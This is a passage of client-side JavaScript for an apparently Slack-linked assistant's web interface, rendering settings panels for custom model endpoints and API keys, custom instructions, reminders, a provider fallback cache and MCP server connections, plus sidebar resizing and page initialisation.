        label.append(title, el('div', 'settings-row-sub', `${ep.model || 'default model'} · ${ep.base_url}`));
        row.appendChild(label);

        const actions = el('div', 'settings-actions');
        const edit = el('button', 'settings-btn', 'Edit');
        edit.addEventListener('click', () => { byokEditId = ep.id; renderSettingsSection(); });
        const del = el('button', 'settings-btn danger', 'Delete');
        del.addEventListener('click', async () => {
          del.disabled = true;
          try {
            await apiJson(`/api/settings/byok/${ep.id}`, { method: 'DELETE' });
            byokEditId = null;
            await refreshSettings();
          } catch (err) {
            settingsBody.appendChild(settingsError('Couldn’t delete endpoint.'));
            del.disabled = false;
          }
        });
        actions.append(edit, del);
        row.appendChild(actions);
        box.appendChild(row);
      }
    }

    box.append(el('h3', 'settings-sec-title', 'Default models'));
    box.appendChild(renderDefaultSelect('text', 'Text model', settingsData.text_endpoint_id, eps));
    box.appendChild(renderDefaultSelect('image', 'Image model', settingsData.image_endpoint_id, eps));

    box.append(el('h3', 'settings-sec-title', byokEditId ? 'Edit endpoint' : 'Add endpoint'));
    const target = byokEditId ? eps.find((e) => e.id === byokEditId) : null;
    box.appendChild(renderByokForm(target));
    settingsBody.appendChild(box);
  }

  function renderDefaultSelect(kind, labelText, currentId, eps) {
    const field = el('div', 'settings-field');
    field.append(el('label', '', labelText));
    const select = document.createElement('select');
    select.className = 'settings-input';
    const noneOpt = document.createElement('option');
    noneOpt.value = 'none';
    noneOpt.textContent = kind === 'text' ? 'Use global key (no BYOK)' : 'Disable image generation';
    select.appendChild(noneOpt);
    for (const ep of eps) {
      const opt = document.createElement('option');
      opt.value = ep.id;
      opt.textContent = `${ep.name} — ${ep.model || 'default'}`;
      select.appendChild(opt);
    }
    select.value = currentId || 'none';
    select.addEventListener('change', async () => {
      try {
        await apiJson(`/api/settings/byok/${kind}-default`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ endpoint_id: select.value }),
        });
        settingsData[kind === 'text' ? 'text_endpoint_id' : 'image_endpoint_id'] =
          select.value === 'none' ? null : select.value;
        renderSettingsSection();
      } catch (err) {
        settingsBody.appendChild(settingsError(`Couldn’t set ${kind} default.`));
        select.value = currentId || 'none';
      }
    });
    field.appendChild(select);
    return field;
  }

  function renderByokForm(target) {
    const form = el('div', 'settings-formgrid');
    const mkField = (labelText, value, placeholder, type) => {
      const field = el('div', 'settings-field');
      field.append(el('label', '', labelText));
      const input = document.createElement('input');
      input.className = 'settings-input';
      input.type = type || 'text';
      input.value = value || '';
      input.placeholder = placeholder || '';
      field.appendChild(input);
      return { field, input };
    };
    const nameF = mkField('Name', target && target.name, 'My endpoint');
    const urlF = mkField('Base URL', target && target.base_url, 'https://api.example.com/v1');
    const keyF = mkField('API key', '', 'sk-…', 'password');
    const modelF = mkField('Model', target && target.model, 'gpt-4o-mini');
    form.append(nameF.field, urlF.field, keyF.field, modelF.field);

    const actions = el('div', 'settings-actions');
    const submit = el('button', 'settings-btn primary', target ? 'Save changes' : 'Add endpoint');
    const cancel = el('button', 'settings-btn', 'Cancel');
    cancel.addEventListener('click', () => { byokEditId = null; renderSettingsSection(); });
    submit.addEventListener('click', async () => {
      const name = nameF.input.value.trim();
      const baseUrl = urlF.input.value.trim();
      if (!name || !baseUrl) {
        settingsBody.appendChild(settingsError('Name and base URL are required.'));
        return;
      }
      submit.disabled = true;
      try {
        if (target) {
          const patch = { name, base_url: baseUrl, model: modelF.input.value.trim() };
          if (keyF.input.value) patch.api_key = keyF.input.value;
          await apiJson(`/api/settings/byok/${target.id}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(patch),
          });
        } else {
          await apiJson('/api/settings/byok', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              name,
              base_url: baseUrl,
              api_key: keyF.input.value,
              model: modelF.input.value.trim(),
            }),
          });
        }
        byokEditId = null;
        await refreshSettings();
      } catch (err) {
        settingsBody.appendChild(settingsError('Couldn’t save endpoint — check the URL.'));
        submit.disabled = false;
      }
    });
    actions.append(submit, cancel);
    form.appendChild(actions);
    return form;
  }

  function renderSectionInstructions() {
    const box = el('div');
    box.append(el('h2', 'settings-section-title', 'Custom instructions'));
    box.append(el('p', 'settings-section-sub', 'Shapes how coolton talks to you. Same effect as setting them on Slack.'));

    const field = el('div', 'settings-field');
    field.append(el('label', '', 'Instructions'));
    const ta = document.createElement('textarea');
    ta.className = 'settings-input';
    ta.rows = 6;
    ta.value = settingsData.instructions || '';
    ta.placeholder = 'e.g. always reply in lowercase, call me Cap…';
    field.appendChild(ta);
    box.appendChild(field);

    const actions = el('div', 'settings-actions');
    const save = el('button', 'settings-btn primary', 'Save');
    save.addEventListener('click', async () => {
      save.disabled = true;
      try {
        await apiJson('/api/settings/instructions', {
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: ta.value }),
        });
        settingsBody.appendChild(settingsNote('Saved.', 'ok'));
      } catch (err) {
        settingsBody.appendChild(settingsError('Couldn’t save instructions.'));
      } finally {
        save.disabled = false;
      }
    });
    actions.appendChild(save);
    box.appendChild(actions);
    settingsBody.appendChild(box);
  }

  function renderSectionReminders() {
    const box = el('div');
    box.append(el('h2', 'settings-section-title', 'Reminders'));
    box.append(el('p', 'settings-section-sub', 'One-shot reminders coolton will DM you. Set new ones from Slack (“remind me in 10 minutes to …”).'));

    const pending = (settingsData.reminders || []).filter((r) => !r.sent && !r.failed);
    if (!pending.length) {
      box.append(el('p', 'settings-empty', 'No pending reminders.'));
    } else {
      for (const r of pending.slice(0, 20)) {
        const row = el('div', 'settings-row');
        const label = el('div', 'settings-row-label');
        label.append(el('div', 'settings-row-title', r.text));
        const due = new Date(r.due_at * 1000);
        const dueStr = due.toLocaleString([], { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
        label.append(el('div', 'settings-row-sub', `#${r.id} · due ${dueStr}`));
        row.appendChild(label);
        box.appendChild(row);
      }
    }
    settingsBody.appendChild(box);
  }

  function renderSectionCache() {
    const box = el('div');
    box.append(el('h2', 'settings-section-title', 'AI fallback cache'));
    box.append(el('p', 'settings-section-sub',
      'Every 30 minutes coolton re-tests each AI provider and caches which one to try first, so it doesn’t wait or retry when one is down. Clearing wipes that and re-probes immediately.'));

    const actions = el('div', 'settings-actions');
    const clear = el('button', 'settings-btn danger', 'Clear fallback cache');
    clear.addEventListener('click', async () => {
      clear.disabled = true;
      try {
        await apiJson('/api/settings/fallback-cache/clear', { method: 'POST' });
        settingsBody.appendChild(settingsNote('Cache cleared.', 'ok'));
      } catch (err) {
        settingsBody.appendChild(settingsError('Couldn’t clear the cache.'));
      } finally {
        clear.disabled = false;
      }
    });
    actions.appendChild(clear);

    if (settingsData.is_admin) {
      const test = el('button', 'settings-btn primary', 'Test all providers');
      test.addEventListener('click', async () => {
        test.disabled = true;
        test.textContent = 'Testing…';
        try {
          const res = await apiJson('/api/settings/providers/test', { method: 'POST' });
          const results = el('div', 'settings-note mono');
          const list = res.results || [];
          if (!list.length) {
            results.textContent = 'No providers configured.';
          } else {
            for (const p of list) {
              results.appendChild(document.createTextNode(`${p.ok ? '✓' : '✕'} ${p.provider} — ${p.display} (${p.elapsed}s)\n`));
            }
          }
          settingsBody.appendChild(results);
        } catch (err) {
          settingsBody.appendChild(settingsError('Provider test failed.'));
        } finally {
          test.disabled = false;
          test.textContent = 'Test all providers';
        }
      });
      actions.appendChild(test);
    }
    box.appendChild(actions);
    settingsBody.appendChild(box);
  }

  function renderSectionMcp() {
    const box = el('div');
    box.append(el('h2', 'settings-section-title', 'MCP servers'));
    box.append(el('p', 'settings-section-sub',
      'Model Context Protocol servers give coolton extra tools (Notion, Linear, …). Managed from here, same as Slack App Home.'));

    const slack = el('div', 'settings-row');
    const slackLabel = el('div', 'settings-row-label');
    slackLabel.append(el('div', 'settings-row-title', 'Slack MCP server'));
    slackLabel.append(el('div', 'settings-row-sub', settingsData.mcp_is_connected ? 'Connected' : 'Disconnected'));
    slack.appendChild(slackLabel);
    box.appendChild(slack);

    const servers = settingsData.mcp_servers || [];
    if (!servers.length) {
      box.append(el('p', 'settings-empty', 'No custom MCP servers.'));
    } else {
      for (const s of servers) {
        const row = el('div', 'settings-row');
        const label = el('div', 'settings-row-label');
        label.append(el('div', 'settings-row-title', s.name));
        label.append(el('div', 'settings-row-sub', `${s.url} · ${s.transport === 'sse' ? 'SSE' : 'Streamable HTTP'}`));
        row.appendChild(label);

        const actions = el('div', 'settings-actions');
        const rm = el('button', 'settings-btn danger', 'Remove');
        rm.addEventListener('click', async () => {
          rm.disabled = true;
          try {
            await apiJson(`/api/settings/mcp/${s.id}`, { method: 'DELETE' });
            await refreshSettings();
          } catch (err) {
            settingsBody.appendChild(settingsError('Couldn’t remove server.'));
            rm.disabled = false;
          }
        });
        actions.appendChild(rm);
        row.appendChild(actions);
        box.appendChild(row);
      }
    }

    box.append(el('h3', 'settings-sec-title', 'Add MCP server'));
    const form = el('div', 'settings-formgrid');
    const mkField = (labelText, value, placeholder, type, tag) => {
      const field = el('div', 'settings-field');
      field.append(el('label', '', labelText));
      const input = document.createElement(tag || 'input');
      input.className = 'settings-input';
      if (tag === 'textarea') {
        input.rows = 3;
        input.placeholder = placeholder || '';
      } else {
        input.type = type || 'text';
        input.placeholder = placeholder || '';
      }
      input.value = value || '';
      field.appendChild(input);
      return { field, input };
    };
    const nameF = mkField('Name', '', 'Notion');
    const urlF = mkField('URL', '', 'https://mcp.example.com/sse');
    const tokF = mkField('Token (optional)', '', 'secret', 'password');
    const headerF = mkField('Headers (optional)', '', 'Authorization: Bearer …', '', 'textarea');
    const transportF = (() => {
      const field = el('div', 'settings-field');
      field.append(el('label', '', 'Transport'));
      const select = document.createElement('select');
      select.className = 'settings-input';
      for (const [v, t] of [['auto', 'Auto'], ['http', 'Streamable HTTP'], ['sse', 'SSE']]) {
        const opt = document.createElement('option');
        opt.value = v;
        opt.textContent = t;
        select.appendChild(opt);
      }
      field.appendChild(select);
      return { field, input: select };
    })();
    form.append(nameF.field, urlF.field, tokF.field, transportF.field, headerF.field);

    const actions = el('div', 'settings-actions');
    const submit = el('button', 'settings-btn primary', 'Connect server');
    submit.addEventListener('click', async () => {
      if (!nameF.input.value.trim() || !urlF.input.value.trim()) {
        settingsBody.appendChild(settingsError('Name and URL are required.'));
        return;
      }
      submit.disabled = true;
      try {
        await apiJson('/api/settings/mcp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: nameF.input.value.trim(),
            url: urlF.input.value.trim(),
            token: tokF.input.value,
            transport: transportF.input.value,
            headers: headerF.input.value,
          }),
        });
        await refreshSettings();
      } catch (err) {
        settingsBody.appendChild(settingsError('Couldn’t connect — check the URL and token.'));
        submit.disabled = false;
      }
    });
    actions.appendChild(submit);
    form.appendChild(actions);
    box.appendChild(form);
    settingsBody.appendChild(box);
  }

  settingsCloseBtn.addEventListener('click', closeSettings);
  settingsModal.addEventListener('click', (e) => {
    if (e.target === settingsModal) closeSettings();
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && !settingsModal.hidden) closeSettings();
  });

  // ---------------------------------------------------------------------
  // Sidebar resizer
  // ---------------------------------------------------------------------

  (function initSidebarResizer() {
    try {
      const saved = Number(localStorage.getItem(SIDEBAR_W_KEY));
      if (saved >= SIDEBAR_MIN && saved <= SIDEBAR_MAX) {
        document.documentElement.style.setProperty('--sidebar-w', `${saved}px`);
      }
    } catch (e) { /* storage unavailable */ }
    let dragging = false;
    const stop = () => {
      if (!dragging) return;
      dragging = false;
      sidebarResizer.classList.remove('resizing');
      document.body.classList.remove('resizing-sidebar');
      const w = parseInt(getComputedStyle(document.documentElement).getPropertyValue('--sidebar-w'), 10);
      if (w >= SIDEBAR_MIN && w <= SIDEBAR_MAX) {
        try { localStorage.setItem(SIDEBAR_W_KEY, String(w)); } catch (e) { }
      }
    };
    sidebarResizer.addEventListener('pointerdown', (e) => {
      dragging = true;
      e.preventDefault();
      sidebarResizer.classList.add('resizing');
      document.body.classList.add('resizing-sidebar');
      sidebarResizer.setPointerCapture(e.pointerId);
    });
    sidebarResizer.addEventListener('pointermove', (e) => {
      if (!dragging) return;
      const w = Math.round(Math.min(SIDEBAR_MAX, Math.max(SIDEBAR_MIN, e.clientX)));
      document.documentElement.style.setProperty('--sidebar-w', `${w}px`);
    });
    sidebarResizer.addEventListener('pointerup', stop);
    sidebarResizer.addEventListener('pointercancel', stop);
  })();

  // ---------------------------------------------------------------------
  // Init
  // ---------------------------------------------------------------------

  // Doesn't create anything — see showDraftState's own comment. Only the
  // composer's first send (createConversation, below) actually POSTs one.
  newConvoBtn.addEventListener('click', () => {
    showDraftState();
    closeDrawer();
    composerInput.focus();
  });

  window.addEventListener('popstate', async () => {
    const id = new URLSearchParams(location.search).get('c');
    if (id) {
      if (id === currentConversationId) return;
      try {
        await selectConversation(id, { skipHistory: true });
      } catch (err) {
        console.error('Failed to open conversation from history', err);
        showDraftState({ skipHistory: true });
      }
    } else if (currentConversationId) {
      showDraftState({ skipHistory: true });
    }
  });

  async function init() {
    const params = new URLSearchParams(location.search);
    if (params.has('signed_out') || params.has('auth_error')) {
      // Bail before any authenticated call (api()'s own 401 handler would
      // otherwise bounce straight back through /oauth/login itself).
      history.replaceState(null, '', location.pathname);
      renderAuthScreen(
        params.has('signed_out') ? "You're signed out." : "Sign-in didn't go through. Try again."
      );
      return;
    }
    try {
      await emojiMapReady;
      await loadMe();
      // "/" on its own (no ?c=) is the same starting point as New session,
      // not a jump into whichever conversation was updated most recently —
      // only a URL that actually names one opens it.
      await loadConversations(params.get('c') || undefined, { skipHistory: true });
    } catch (err) {
      console.error('Failed to initialize coolton web UI', err);
    }
    // Only the currently-open conversation has a live stream, so a turn
    // finishing in another one is otherwise invisible until this polls it.
    setInterval(() => {
      if (!document.hidden) refreshSidebarMeta();
    }, 10000);
  }
  init();
})();
